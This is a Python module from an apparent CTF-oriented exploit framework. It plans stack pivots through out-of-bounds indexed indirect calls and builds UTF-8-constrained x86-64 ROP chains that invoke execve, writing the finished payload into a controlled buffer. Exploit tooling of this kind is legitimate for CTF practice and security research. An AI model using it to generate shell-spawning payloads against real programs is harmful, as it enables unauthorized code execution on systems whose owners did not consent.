"""Ergonomic constrained control-flow and ROP intent frontend."""

from __future__ import annotations

from dataclasses import dataclass, field, replace
from types import MappingProxyType
from typing import Any, Callable, Iterable, Mapping

from .actions import Action, Sequence as ActionSequence, sequence
from .architecture import ArchitectureSpec, architecture as resolve_architecture
from .domain import Capability, EffectContract, Evidence, Scope
from .errors import ConstraintError, PlanningError
from .providers import GoalRequest, GoalStrategy


@dataclass(frozen=True, slots=True)
class ByteConstraint:
    name: str
    encoding: str

    def describe(self) -> str:
        return self.name

    def validate(self, data: bytes, *, role: str = "payload") -> bytes:
        try:
            data.decode(self.encoding)
        except UnicodeDecodeError as error:
            raise ConstraintError(
                f"{role} violates {self.name} encoding at byte {error.start:#x}"
            ) from error
        return data


def utf8() -> ByteConstraint:
    return ByteConstraint("UTF-8", "utf-8")


def _constraints(values: Iterable[ByteConstraint]) -> tuple[ByteConstraint, ...]:
    result = tuple(values)
    if any(not isinstance(item, ByteConstraint) for item in result):
        raise TypeError("buffer and ROP constraints must be ByteConstraint values")
    return result


def _validate_bytes(
    data: bytes,
    constraints: Iterable[ByteConstraint],
    *,
    role: str,
) -> bytes:
    for constraint in constraints:
        constraint.validate(data, role=role)
    return data


def _qword(value: int, constraints: Iterable[ByteConstraint], *, role: str) -> bytes:
    if not isinstance(value, int) or not 0 <= value < 1 << 64:
        raise ConstraintError(f"{role} must be an unsigned 64-bit address/value")
    return _validate_bytes(value.to_bytes(8, "little"), constraints, role=role)


_REGISTER_ALIASES = {
    "eax": "rax",
    "ebx": "rbx",
    "ecx": "rcx",
    "edx": "rdx",
    "esi": "rsi",
    "edi": "rdi",
    "ebp": "rbp",
    "esp": "rsp",
    **{f"r{index}d": f"r{index}" for index in range(8, 16)},
}


def _register(value: str, architecture: ArchitectureSpec | None = None) -> str:
    normalized = value.lower().strip()
    if not normalized or not normalized.replace("_", "").isalnum():
        raise PlanningError(f"invalid register name {value!r}")
    canonical = _REGISTER_ALIASES.get(normalized, normalized)
    if architecture is not None and canonical not in architecture.registers:
        raise PlanningError(
            f"register {value!r} normalizes to {canonical!r}, which is not valid for "
            f"{architecture.name}; declared registers: {', '.join(architecture.registers)}"
        )
    return canonical


def _register_map(
    values: Mapping[str, int],
    architecture: ArchitectureSpec | None = None,
) -> dict[str, int]:
    result: dict[str, int] = {}
    for register, address in values.items():
        key = _register(register, architecture)
        if key in result and result[key] != int(address):
            raise PlanningError(f"conflicting gadget addresses for register {key}")
        result[key] = int(address)
    return result


def _move_map(
    values: Mapping[tuple[str, str], int],
    architecture: ArchitectureSpec | None = None,
) -> dict[tuple[str, str], int]:
    result: dict[tuple[str, str], int] = {}
    for (target, source), address in values.items():
        key = (
            _register(target, architecture),
            _register(source, architecture),
        )
        if key in result and result[key] != int(address):
            raise PlanningError(f"conflicting move gadget addresses for {key[0]},{key[1]}")
        result[key] = int(address)
    return result


@dataclass(frozen=True, slots=True)
class BufferSlice:
    buffer: "ControlledBuffer" = field(repr=False, compare=False)
    offset: int
    size: int
    role: str = "buffer region"
    data: bytes | None = None

    @property
    def address(self) -> int:
        return self.buffer.address + self.offset

    def describe(self) -> str:
        return f"{self.buffer.name}+{self.offset:#x} ({self.role})"


@dataclass(frozen=True, slots=True)
class _BufferRegion:
    offset: int
    size: int
    role: str
    data: bytes | None = None
    generated: bool = False

    @property
    def end(self) -> int:
        return self.offset + self.size

    def range(self) -> str:
        return f"[{self.offset:#x}, {self.end:#x})"


@dataclass(slots=True)
class _BufferLayout:
    size: int
    regions: list[_BufferRegion] = field(default_factory=list)

    def clone_base(self) -> "_BufferLayout":
        return _BufferLayout(
            self.size,
            [
                region
                for region in self.regions
                if not region.generated or region.role.startswith("ROP ")
            ],
        )

    def clone(self) -> "_BufferLayout":
        return _BufferLayout(self.size, list(self.regions))

    def reserve(
        self,
        offset: int,
        size: int,
        role: str,
        *,
        data: bytes | None = None,
        generated: bool = False,
    ) -> _BufferRegion:
        candidate = _BufferRegion(int(offset), int(size), role, data, generated)
        if candidate.offset < 0 or candidate.size <= 0 or candidate.end > self.size:
            raise PlanningError(
                f"buffer region {role} {candidate.range()} is outside [0, {self.size:#x})"
            )
        for existing in self.regions:
            if candidate.end <= existing.offset or candidate.offset >= existing.end:
                continue
            raise PlanningError(
                f"buffer region {role} {candidate.range()} overlaps "
                f"{existing.role} {existing.range()}"
            )
        self.regions.append(candidate)
        self.regions.sort(key=lambda region: (region.offset, region.end, region.role))
        return candidate

    def first_fit(
        self,
        size: int,
        *,
        alignment: int = 1,
        start: int = 0,
        role: str,
        data: bytes | None = None,
        generated: bool = False,
    ) -> _BufferRegion:
        candidate = int(start)
        while candidate + size <= self.size:
            candidate = (candidate + alignment - 1) & -alignment
            collision = next(
                (
                    region
                    for region in self.regions
                    if not (
                        candidate + size <= region.offset
                        or candidate >= region.end
                    )
                ),
                None,
            )
            if collision is None:
                return self.reserve(
                    candidate,
                    size,
                    role,
                    data=data,
                    generated=generated,
                )
            candidate = collision.end
        raise PlanningError(
            f"buffer {role} of {size:#x} bytes has no non-overlapping region"
        )


@dataclass(slots=True)
class ControlledBuffer:
    challenge: Any = field(repr=False)
    name: str
    address: int
    size: int
    writer: Callable[..., Action] | None
    constraints: tuple[ByteConstraint, ...] = ()
    _layout: _BufferLayout = field(init=False, repr=False)
    _revision: int = field(default=0, init=False, repr=False)

    def __post_init__(self) -> None:
        if not self.name:
            raise ValueError("controlled buffer name must not be empty")
        if self.address < 0 or self.size <= 0:
            raise ValueError("controlled buffer requires a non-negative address and positive size")
        if self.writer is not None and not callable(self.writer):
            raise TypeError("controlled buffer writer must be a protocol operation")
        self.constraints = _constraints(self.constraints)
        self._layout = _BufferLayout(self.size)

    def qword(self, offset: int) -> BufferSlice:
        if offset < 0 or offset + 8 > self.size:
            raise PlanningError(
                f"qword at offset {offset:#x} is outside controlled buffer "
                f"{self.name} ({self.size:#x} bytes)"
            )
        layout = self._layout.clone_base()
        existing = next(
            (
                region
                for region in layout.regions
                if region.offset == int(offset)
                and region.size == 8
                and region.role == "dispatch qword"
            ),
            None,
        )
        if existing is not None:
            return BufferSlice(self, existing.offset, existing.size, existing.role)
        region = layout.reserve(int(offset), 8, "dispatch qword")
        self._layout = layout
        self._revision += 1
        return BufferSlice(self, region.offset, region.size, region.role)

    def __getitem__(self, offset: int) -> BufferSlice:
        return self.qword(offset)

    def written_by(self, operation: Callable[..., Action]) -> "ControlledBuffer":
        if not callable(operation):
            raise TypeError("written_by requires a callable protocol operation")
        owner = getattr(operation, "challenge", None)
        if owner is not None and owner is not self.challenge:
            raise PlanningError("buffer writer operation belongs to another challenge")
        binder = getattr(operation, "bind_buffer", None)
        self.writer = binder(self.size) if callable(binder) else operation
        return self

    def dispatch(self, offset: int | None = None) -> BufferSlice:
        """Reserve an indirect-call qword, defaulting to the buffer's final slot."""

        selected = ((self.size - 8) & -8) if offset is None else int(offset)
        return self.qword(selected)

    def store(
        self,
        data: bytes | str,
        *,
        offset: int | None = None,
        alignment: int = 1,
    ) -> BufferSlice:
        raw = data.encode() if isinstance(data, str) else bytes(data)
        if not raw:
            raise ValueError("controlled-buffer storage cannot be empty")
        if alignment <= 0 or alignment & (alignment - 1):
            raise ValueError("storage alignment must be a positive power of two")
        _validate_bytes(raw, self.constraints, role=f"stored bytes in {self.name}")
        layout = self._layout.clone_base()
        if offset is None:
            region = layout.first_fit(
                len(raw),
                alignment=alignment,
                role="stored data",
                data=raw,
            )
        else:
            region = layout.reserve(
                int(offset),
                len(raw),
                "stored data",
                data=raw,
            )
        self._layout = layout
        self._revision += 1
        return BufferSlice(self, region.offset, region.size, region.role, raw)

    def describe(self) -> str:
        constraint = ", ".join(item.describe() for item in self.constraints) or "unconstrained"
        return f"controlled buffer {self.name} at {self.address:#x}, {self.size:#x} bytes, {constraint}"


@dataclass(frozen=True, slots=True)
class IndirectCallControl:
    challenge: Any = field(repr=False, compare=False)
    architecture_spec: ArchitectureSpec
    table: int
    index_operation: Callable[..., Action]
    target: BufferSlice
    trigger: Callable[..., Action] | Action
    state: Mapping[str, Any]
    state_labels: Mapping[str, str]
    index: int
    capability: Capability

    def pivot(
        self,
        *,
        stack: ControlledBuffer | None = None,
        gadget: int,
        pointer_register: str | None = None,
        **register_state: Any,
    ) -> "PivotControl":
        if pointer_register is not None and register_state:
            raise TypeError("pass pointer_register= or one register keyword, not both")
        if pointer_register is None:
            if len(register_state) != 1:
                raise TypeError(
                    "pivot requires pointer_register= or exactly one register=buffer keyword"
                )
            pointer_register, declared_pointer = next(iter(register_state.items()))
            if stack is None and isinstance(declared_pointer, ControlledBuffer):
                stack = declared_pointer
            if stack is None:
                raise TypeError(
                    "register-keyword pivot requires a ControlledBuffer value or stack="
                )
            pointer_value = (
                declared_pointer.address
                if isinstance(declared_pointer, ControlledBuffer)
                else declared_pointer
            )
            if pointer_value != stack.address:
                raise PlanningError(
                    f"pivot register {pointer_register} does not point at buffer {stack.name}"
                )
        if stack is None:
            raise TypeError("explicit pivot requires stack=<ControlledBuffer>")
        if stack.challenge is not self.challenge or self.target.buffer is not stack:
            raise PlanningError("stack pivot buffer belongs to another control/challenge")
        register = _register(pointer_register, self.architecture_spec)
        actual = self.state.get(register)
        if actual != stack.address:
            raise PlanningError(
                f"pivot requires {register} to point at buffer {stack.name} "
                f"({stack.address:#x}); declared state is {actual!r}"
            )
        _qword(gadget, stack.constraints, role="stack-pivot gadget")
        capability = Capability(
            "controlled stack pivot",
            EffectContract(
                requires=(self.capability,),
                reads=frozenset({"process.registers", "process.memory"}),
                writes=frozenset({"process.stack", "process.control-flow"}),
                scope=Scope.PROCESS,
                evidence=(
                    Evidence(
                        "control",
                        f"{register} points at controlled buffer {stack.name}",
                        f"pivot gadget {gadget:#x}",
                    ),
                ),
            ),
            reliability="declared",
        )
        return PivotControl(
            self,
            stack,
            register,
            self.state_labels.get(register, register),
            int(gadget),
            capability,
        )

    def describe(self) -> str:
        return f"indexed indirect call through table {self.table:#x} using index {self.index}"


@dataclass(frozen=True, slots=True)
class PivotControl:
    dispatch: IndirectCallControl
    stack: ControlledBuffer
    pointer_register: str
    pointer_label: str
    gadget: int
    capability: Capability

    @property
    def challenge(self) -> Any:
        return self.dispatch.challenge

    def describe(self) -> str:
        return f"stack pivot through {self.pointer_label} into {self.stack.name}"


@dataclass(frozen=True, slots=True)
class RopPalette:
    challenge: Any = field(repr=False, compare=False)
    artifact_sha256: str = ""
    architecture: str = ""
    architecture_spec: ArchitectureSpec | None = field(default=None, repr=False)
    pop: Mapping[str, int] = field(default_factory=dict)
    zero: Mapping[str, int] = field(default_factory=dict)
    move: Mapping[tuple[str, str], int] = field(default_factory=dict)
    syscall: int | None = None
    constraints: tuple[ByteConstraint, ...] = ()

    def __post_init__(self) -> None:
        constraints = _constraints(self.constraints)
        if self.architecture_spec is None:
            raise ValueError("ROP palette requires an ArchitectureSpec")
        object.__setattr__(self, "constraints", constraints)
        object.__setattr__(
            self,
            "pop",
            MappingProxyType(_register_map(self.pop, self.architecture_spec)),
        )
        object.__setattr__(
            self,
            "zero",
            MappingProxyType(_register_map(self.zero, self.architecture_spec)),
        )
        object.__setattr__(
            self,
            "move",
            MappingProxyType(_move_map(self.move, self.architecture_spec)),
        )
        for register, address in self.pop.items():
            _qword(address, constraints, role=f"pop {register} gadget")
        for register, address in self.zero.items():
            _qword(address, constraints, role=f"zero {register} gadget")
        for (target, source), address in self.move.items():
            _qword(address, constraints, role=f"move {target},{source} gadget")
        if self.syscall is not None:
            _qword(self.syscall, constraints, role="syscall gadget")

    def describe(self) -> str:
        return (
            f"constrained ROP palette for {self.architecture} "
            f"artifact {self.artifact_sha256[:12]}"
        )


class RopNamespace:
    def __init__(self, challenge: Any):
        self.challenge = challenge
        self.architecture = resolve_architecture(challenge.exe.architecture)

    def __call__(
        self,
        *,
        constraint: ByteConstraint | None = None,
        constraints: Iterable[ByteConstraint] = (),
        encoding: str | None = None,
        **gadgets: int,
    ) -> RopPalette:
        declared_constraints = tuple(constraints)
        if constraint is not None and not isinstance(constraint, ByteConstraint):
            raise TypeError("ROP constraint keyword requires a ByteConstraint")
        if encoding is not None:
            if constraint is not None or declared_constraints:
                raise TypeError("pass encoding= or constraint(s)=, not both")
            normalized_encoding = encoding.lower().replace("-", "")
            if normalized_encoding != "utf8":
                raise PlanningError(f"unsupported ROP encoding keyword {encoding!r}")
            constraint = utf8()
        pop: dict[str, int] = {}
        zero: dict[str, int] = {}
        move: dict[tuple[str, str], int] = {}
        syscall: int | None = None
        try:
            for semantic, address in gadgets.items():
                if semantic == "syscall":
                    syscall = int(address)
                    continue
                prefix, separator, operands = semantic.partition("_")
                if not separator or not operands:
                    raise PlanningError(
                        f"unknown ROP semantic keyword {semantic!r}; expected pop_REG, "
                        "zero_REG, move_DST_SRC, or syscall"
                    )
                parts = operands.split("_")
                if prefix == "pop" and len(parts) == 1:
                    pop[parts[0]] = int(address)
                elif prefix == "zero" and len(parts) == 1:
                    zero[parts[0]] = int(address)
                elif prefix == "move" and len(parts) == 2:
                    move[(parts[0], parts[1])] = int(address)
                else:
                    raise PlanningError(
                        f"malformed ROP semantic keyword {semantic!r}; expected pop_REG, "
                        "zero_REG, move_DST_SRC, or syscall"
                    )
            return self.palette(
                pop=pop,
                zero=zero,
                move=move,
                syscall=syscall,
                constraint=constraint,
                constraints=declared_constraints,
            )
        except PlanningError as error:
            if "ROP" in str(error) or "gadget" in str(error) or "semantic" in str(error):
                raise
            raise PlanningError(f"invalid ROP gadget keyword: {error}") from error

    def palette(
        self,
        *,
        pop: Mapping[str, int] | None = None,
        zero: Mapping[str, int] | None = None,
        move: Mapping[tuple[str, str], int] | None = None,
        syscall: int | None = None,
        pinned: Mapping[str, int] | None = None,
        constraints: Iterable[ByteConstraint] = (),
        constraint: ByteConstraint | None = None,
    ) -> RopPalette:
        pop_values = _register_map(pop or {}, self.architecture)
        zero_values = _register_map(zero or {}, self.architecture)
        move_values = _move_map(move or {}, self.architecture)
        syscall_value = syscall
        for instruction, address in (pinned or {}).items():
            normalized = " ".join(
                instruction.lower().replace(",", " ").replace("; ret", "").split()
            )
            parts = normalized.split()
            if len(parts) == 2 and parts[0] == "pop":
                pop_values[_register(parts[1], self.architecture)] = address
            elif len(parts) == 2 and parts[0] == "zero":
                zero_values[_register(parts[1], self.architecture)] = address
            elif len(parts) == 3 and parts[0] == "xor":
                left = _register(parts[1], self.architecture)
                right = _register(parts[2], self.architecture)
                if left != right:
                    raise PlanningError(
                        f"zeroing xor gadget must use identical operands, got {left},{right}"
                    )
                zero_values[left] = address
            elif len(parts) == 3 and parts[0] in {"move", "mov"}:
                move_values[
                    (
                        _register(parts[1], self.architecture),
                        _register(parts[2], self.architecture),
                    )
                ] = address
            elif normalized in {"syscall", "syscall ret"}:
                syscall_value = address
            else:
                raise PlanningError(
                    f"unsupported pinned gadget semantic {instruction!r}; use pop=, "
                    "zero=, move=, or syscall= explicitly"
                )
        declared_constraints = tuple(constraints)
        if constraint is not None:
            if declared_constraints:
                raise TypeError("pass constraint= or constraints=, not both")
            declared_constraints = (constraint,)
        return RopPalette(
            self.challenge,
            self.challenge.exe.sha256,
            self.challenge.exe.architecture,
            self.architecture,
            pop_values,
            zero_values,
            move_values,
            syscall_value,
            declared_constraints,
        )


@dataclass(frozen=True, slots=True)
class _ExecveIntent:
    challenge: Any = field(repr=False, compare=False)
    path: bytes
    control: PivotControl | None = None
    palette: RopPalette | None = None
    cache: "_ExecveCache" = field(
        default_factory=lambda: _ExecveCache(),
        repr=False,
        compare=False,
    )
    terminal: bool = True

    def with_control(self, control: Any) -> "_ExecveIntent":
        if not isinstance(control, PivotControl) or control.challenge is not self.challenge:
            raise PlanningError("execve via= requires a stack pivot from this challenge")
        return _prepare_execve_intent(replace(self, control=control))

    def with_using(self, using: Any) -> "_ExecveIntent":
        if not isinstance(using, RopPalette):
            raise PlanningError("execve using= requires x.rop.palette(...)")
        if using.challenge is not self.challenge:
            raise PlanningError("execve ROP palette belongs to another challenge")
        if using.artifact_sha256 != self.challenge.exe.sha256:
            raise PlanningError("execve ROP palette artifact identity does not match target")
        if using.architecture != self.challenge.exe.architecture:
            raise PlanningError("execve ROP palette architecture does not match target")
        expected = resolve_architecture(self.challenge.exe.architecture)
        if using.architecture_spec != expected:
            raise PlanningError("execve ROP palette ArchitectureSpec does not match target")
        return _prepare_execve_intent(replace(self, palette=using))

    def describe(self) -> str:
        return f"execve({self.path.rstrip(bytes([0]))!r}) with constrained ROP"


@dataclass(slots=True)
class _ExecveCache:
    revision: int = -1
    prepared: tuple[Action, ...] | None = None
    error: str | None = None


def _append_qword(output: bytearray, offset: int, value: int) -> None:
    end = offset + 8
    if end > len(output):
        output.extend(bytes(end - len(output)))
    output[offset:end] = value.to_bytes(8, "little")


def _require(mapping: Mapping[Any, int], key: Any, *, realization: str) -> int:
    try:
        return int(mapping[key])
    except KeyError as error:
        raise PlanningError(f"cannot realize execve register state: missing {realization}") from error


def _build_execve_payload(intent: _ExecveIntent) -> tuple[bytes, _BufferLayout]:
    control = intent.control
    palette = intent.palette
    if control is None:
        raise PlanningError("execve requires via=<stack pivot control>")
    if palette is None:
        raise PlanningError("execve requires using=<constrained ROP palette>")
    if palette.syscall is None:
        raise PlanningError("cannot realize execve: missing syscall gadget")
    stack = control.stack
    constraints = tuple(dict.fromkeys((*stack.constraints, *palette.constraints)))

    pop_rdi = _require(palette.pop, "rdi", realization="pop rdi")
    pop_rsi = _require(palette.pop, "rsi", realization="pop rsi")
    zero_rax = _require(palette.zero, "rax", realization="zero rax")
    move_rdx_rax = _require(
        palette.move,
        ("rdx", "rax"),
        realization="move rdx from zeroed rax",
    )
    pop_rcx = _require(palette.pop, "rcx", realization="pop rcx for syscall number")
    move_rax_rcx = _require(
        palette.move,
        ("rax", "rcx"),
        realization="move syscall number from rcx to rax",
    )

    fixed = {
        0x00: (pop_rdi, "ROP pop rdi"),
        0x08: (0, "ROP path pointer"),
        0x10: (pop_rsi, "ROP pop rsi"),
        0x18: (0, "ROP rsi value"),
        0x20: (zero_rax, "ROP zero rax"),
        0x28: (move_rdx_rax, "ROP move rdx,rax"),
        0x30: (pop_rcx, "ROP pop rcx"),
        0x38: (59, "ROP execve syscall number"),
        0x40: (move_rax_rcx, "ROP move rax,rcx"),
        0x48: (int(palette.syscall), "ROP syscall"),
    }
    layout = stack._layout.clone_base()
    dispatch = control.dispatch.target
    if not any(
        region.offset == dispatch.offset
        and region.size == 8
        and region.role == "dispatch qword"
        for region in layout.regions
    ):
        raise PlanningError("dispatch qword is not reserved as a complete 8-byte region")
    for offset, (_value, role) in fixed.items():
        if not any(
            region.offset == offset and region.size == 8 and region.role == role
            for region in layout.regions
        ):
            layout.reserve(offset, 8, role, generated=True)
    path = intent.path if intent.path.endswith(bytes([0])) else intent.path + bytes([0])
    for path_offset in range(0, stack.size - len(path) + 1):
        planned = layout.clone()
        try:
            path_region = planned.reserve(
                path_offset,
                len(path),
                "generated execve path",
                data=path,
                generated=True,
            )
        except PlanningError:
            continue
        path_pointer = stack.address + path_offset
        placements = {
            **{offset: value for offset, (value, _role) in fixed.items()},
            0x08: path_pointer,
            dispatch.offset: control.gadget,
        }
        output_size = max(region.end for region in planned.regions)
        output = bytearray(output_size)
        try:
            for region in planned.regions:
                if region.data is not None:
                    output[region.offset : region.end] = region.data
            for offset, value in placements.items():
                _qword(value, constraints, role=f"ROP qword at {offset:#x}")
                _append_qword(output, offset, value)
            output[path_region.offset : path_region.end] = path
            _validate_bytes(bytes(output), constraints, role="final controlled-buffer payload")
        except ConstraintError:
            continue
        return bytes(output), planned
    raise PlanningError(
        f"cannot place {path!r} in controlled buffer {stack.name} while satisfying "
        + ", ".join(item.describe() for item in constraints)
    )


def _operation_action(operation: Callable[..., Any] | Action, *args: Any) -> Action:
    if isinstance(operation, Action):
        if args:
            raise TypeError("pre-built action operation does not accept arguments")
        return operation
    produced = operation(*args)
    if not isinstance(produced, Action):
        raise PlanningError("declared protocol operation did not produce an Action")
    return produced


def _semantic_sequence(action: Action, name: str) -> ActionSequence:
    if isinstance(action, ActionSequence):
        return sequence(action, name=name)
    return sequence(action, name=name)


def _operation_menus(*operations: Any) -> tuple[Any, ...]:
    menus: dict[int, Any] = {}
    pending = list(operations)
    seen: set[int] = set()
    while pending:
        operation = pending.pop()
        if id(operation) in seen:
            continue
        seen.add(id(operation))
        owner = getattr(operation, "__self__", None)
        closure = getattr(operation, "__closure__", None) or ()
        values = [owner, *(cell.cell_contents for cell in closure)]
        for value in values:
            if hasattr(value, "_next_operation_id"):
                menus[id(value)] = value
            elif callable(value) and value is not operation:
                pending.append(value)
    return tuple(menus.values())


def _prepare_execve_intent(intent: _ExecveIntent) -> _ExecveIntent:
    if intent.control is None or intent.palette is None:
        return intent
    stack = intent.control.stack
    writer_operation = stack.writer
    if writer_operation is None:
        intent.cache.revision = stack._revision
        intent.cache.prepared = None
        intent.cache.error = (
            f"controlled buffer {stack.name} has no writer; call "
            f"{stack.name}.written_by(operation)"
        )
        return intent
    cache = intent.cache
    if cache.revision == stack._revision:
        return intent
    dispatch = intent.control.dispatch
    menus = _operation_menus(stack.writer, dispatch.index_operation, dispatch.trigger)
    menu_counters = {id(menu): menu._next_operation_id for menu in menus}
    try:
        payload, planned_layout = _build_execve_payload(intent)
        palette = intent.palette
        assert palette is not None
        assert palette.syscall is not None
        palette_summary = (
            f"pop={','.join(sorted(palette.pop)) or '-'}; "
            f"zero={','.join(sorted(palette.zero)) or '-'}; "
            f"move={','.join(f'{target}<-{source}' for target, source in sorted(palette.move)) or '-'}; "
            f"syscall={palette.syscall:#x}"
        )
        writer = _semantic_sequence(
            _operation_action(writer_operation, payload),
            (
                f"controlled buffer {intent.control.stack.name} at "
                f"{intent.control.stack.address:#x}, size {intent.control.stack.size:#x}: "
                f"UTF-8 ROP layout; constrained ROP palette: {palette_summary}"
            ),
        )
        pointer_value = dispatch.state[intent.control.pointer_register]
        index = _semantic_sequence(
            _operation_action(dispatch.index_operation, dispatch.index),
            (
                f"indexed indirect call: table {dispatch.table:#x} -> target "
                f"{dispatch.target.address:#x}, index {dispatch.index}; pre-call "
                f"{intent.control.pointer_label}={pointer_value:#x}"
            ),
        )
        trigger = _semantic_sequence(
            _operation_action(dispatch.trigger),
            (
                f"trigger indexed indirect call and stack pivot with gadget "
                f"{intent.control.gadget:#x} into {intent.control.stack.name}"
            ),
        )
    except PlanningError as error:
        for menu in menus:
            menu._next_operation_id = menu_counters[id(menu)]
        cache.revision = stack._revision
        cache.prepared = None
        cache.error = str(error)
        return intent
    except BaseException:
        for menu in menus:
            menu._next_operation_id = menu_counters[id(menu)]
        raise
    stack._layout = planned_layout
    cache.revision = stack._revision
    cache.prepared = (writer, index, trigger)
    cache.error = None
    return intent


def _install_execve_strategy(challenge: Any) -> None:
    name = "constrained ROP execve"
    if any(item.name == name for item in challenge.providers.strategies):
        return

    def supports(_context: Any, goal: GoalRequest) -> bool:
        return (
            isinstance(goal.intent, _ExecveIntent)
            and goal.intent.challenge is challenge
            and goal.intent.control is not None
            and goal.intent.palette is not None
        )

    def lower(_context: Any, goal: GoalRequest) -> tuple[Action, ...]:
        intent = goal.intent
        if not isinstance(intent, _ExecveIntent) or intent.control is None:
            raise PlanningError("execve requires a stack pivot control")
        _prepare_execve_intent(intent)
        if intent.cache.error is not None:
            raise PlanningError(intent.cache.error)
        if intent.cache.prepared is None:
            raise PlanningError("execve control/palette did not prepare a payload plan")
        return intent.cache.prepared

    challenge.providers.register_strategy(
        GoalStrategy(
            name,
            "effect.execve",
            (),
            lower,
            supports=supports,
            reliability="declared",
            cost=6,
            evidence=(
                Evidence(
                    "strategy",
                    "indexed indirect call, stack pivot, and constrained ROP",
                    f"{challenge.exe.architecture}:{challenge.exe.sha256}",
                ),
            ),
            assumptions=(
                "pinned palette addresses implement the declared register semantics",
                "the indirect-call state and controlled-buffer addresses are exact",
                (
                    f"ROP palette is bound to {challenge.exe.architecture} artifact "
                    f"{challenge.exe.sha256[:12]}"
                ),
            ),
        )
    )


def buffer(
    challenge: Any,
    name: str,
    *,
    at: int,
    size: int,
    writer: Callable[..., Action] | None = None,
    constraints: Iterable[ByteConstraint] = (),
) -> ControlledBuffer:
    return ControlledBuffer(
        challenge,
        name,
        int(at),
        int(size),
        writer,
        tuple(constraints),
    )


def indirect_call(
    challenge: Any,
    *,
    table: int,
    index: Callable[..., Action],
    target: BufferSlice | ControlledBuffer,
    offset: int | None = None,
    trigger: Callable[..., Action] | Action,
    state: Mapping[str, Any],
) -> IndirectCallControl:
    if isinstance(target, ControlledBuffer):
        target = target.dispatch(offset)
    elif offset is not None:
        raise TypeError("offset= is only valid when target is a ControlledBuffer")
    if target.buffer.challenge is not challenge:
        raise PlanningError("indirect-call target belongs to another challenge")
    delta = target.address - int(table)
    if delta % 8:
        raise PlanningError(
            "indexed indirect call target is not aligned to an 8-byte table entry"
        )
    selected_index = delta // 8
    architecture = resolve_architecture(challenge.exe.architecture)
    normalized_state: dict[str, int] = {}
    state_labels: dict[str, str] = {}
    for register, value in state.items():
        if not isinstance(register, str) or not isinstance(value, int):
            raise PlanningError("indirect-call state must map register names to integers")
        normalized = _register(register, architecture)
        normalized_state[normalized] = value
        state_labels[normalized] = register.lower().strip()
    capability = Capability(
        "indexed indirect call control",
        EffectContract(
            reads=frozenset({"process.memory", "process.registers"}),
            writes=frozenset({"process.control-flow"}),
            scope=Scope.PROCESS,
            evidence=(
                Evidence(
                    "control",
                    f"table {int(table):#x}, target {target.address:#x}, index {selected_index}",
                    "declared out-of-bounds index",
                ),
            ),
        ),
        reliability="declared",
    )
    return IndirectCallControl(
        challenge,
        architecture,
        int(table),
        index,
        target,
        trigger,
        MappingProxyType(normalized_state),
        MappingProxyType(state_labels),
        selected_index,
        capability,
    )


def execve_goal(challenge: Any, path: bytes | str) -> GoalRequest:
    raw = path.encode() if isinstance(path, str) else bytes(path)
    if not raw:
        raise ValueError("execve path must not be empty")
    _install_execve_strategy(challenge)
    return GoalRequest("effect.execve", intent=_ExecveIntent(challenge, raw))


def attach_using(goal: GoalRequest, using: Any) -> GoalRequest:
    method = getattr(goal.intent, "with_using", None)
    if not callable(method):
        return goal
    return replace(goal, intent=method(using))


def terminal_goal(effect: Any) -> bool:
    return bool(getattr(getattr(effect, "intent", None), "terminal", False))

